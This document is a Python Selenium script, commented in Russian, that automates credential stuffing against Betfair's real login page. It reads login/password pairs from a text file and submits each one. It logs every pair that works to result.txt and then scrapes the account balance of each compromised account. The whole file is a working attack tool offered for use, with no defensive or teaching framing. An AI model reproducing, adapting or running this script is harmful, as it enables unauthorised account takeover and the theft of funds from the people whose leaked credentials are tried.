from selenium.webdriver import Chrome
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
import time
from selenium.webdriver.common.keys import Keys
from selenium.webdriver import ActionChains
import os
import colorama
from colorama import Fore, Back, Style
colorama.init()

# Это нужно при частых тестах, чтобы точно были убиты все экземпляры в системе из памяти
# В рабочем режиме можно закомментировать

## Windows
os.system("TASKKILL /F /IM chrome.exe")
time.sleep(1)
os.system("TASKKILL /F /IM chromedriver.exe")
time.sleep(1)
## Linux
#os.system("killall chrome")

# Инициализация

n = 0

file = 'wiolence.txt'
fs1 = open(file, 'r')
lines_in_file = fs1.readlines()
fs1.close()

sum_lines = sum(1 for line in open(file, 'r'))

print(Fore.RED + "number of pairs login/pass in file:" + str(sum_lines))
print(Style.RESET_ALL)

base_site = "https://identitysso.betfair.com/view/login"

options = Options()
options.add_argument('--no-sandbox')
options.add_argument('--disable-dev-shm-usage')
options.add_argument("--remote-debugging-port=9222")
options.add_experimental_option("detach", True)
#options.add_argument('--headless')

driver = Chrome(executable_path=r'С:\\st\\chromedriver.exe', options=options)
#driver = Chrome(executable_path=r'/home/rnutx/chromedriver', options=options)

# Рабочий цикл

while n < sum_lines:
    try:
        driver.get(base_site)
        time.sleep(6)
            # ждем подгрузки страницы и нажимаем на соглашение, что разрешаем хранить куки
        try:
            driver.find_element_by_xpath('//*[@id="onetrust-accept-btn-handler"]').click()
        except:
            print(Fore.RED +"error cookies confirmation")
            print(Style.RESET_ALL)
        time.sleep(1)
        
        print('\033[33miteration ' + str(n+1) + '\033[0m')

        pair_line = lines_in_file[n].split(' ') # Разделитель пары логин/пароль - пробел. Если иное, заменить пробел на символ разделителя
        login = pair_line[0]
        password = pair_line[1].strip('\n')

        # пытаемся зайти

        input_login = driver.find_element_by_xpath('//*[@id="username"]')
        input_password = driver.find_element_by_xpath('//*[@id="password"]')
        time.sleep(1)
        input_login.send_keys(login)
        time.sleep(1)
        input_password.send_keys(password)
        time.sleep(1)
        driver.find_element_by_xpath('//*[@id="login"]').click()
        time.sleep(5)
        try:
            driver.find_element_by_xpath('//*[@id="showMessage"]/p')
            print('\033[31mwrong login or password with pairs: ' + login + '/' + password + '\033[0m')
        except:
            with open('result.txt',mode='a') as f:
                print('true login with pairs: ' + login + '/' + password , file=f)
            time.sleep(2)
            try:
                driver.get('https://myaccount.betfair.com/summary/accountsummary')
                time.sleep(3)
                balance = driver.find_element_by_xpath('//*[@id="root"]/div/div/div[2]/div/div[3]/div[1]/div/div[1]/span').text
                with open('result.txt',mode='a') as f:
                    print('BALANCE is:' + balance ,file=f)
                driver.delete_all_cookies()
            except:
                print("error balance")
            time.sleep(2)

        n += 1

        driver.refresh()
        time.sleep(1)
        if n == sum_lines:
            driver.quit()
    except:
        print('\033[31m' + 'ERROR main func...\033[0m')
        n += 1


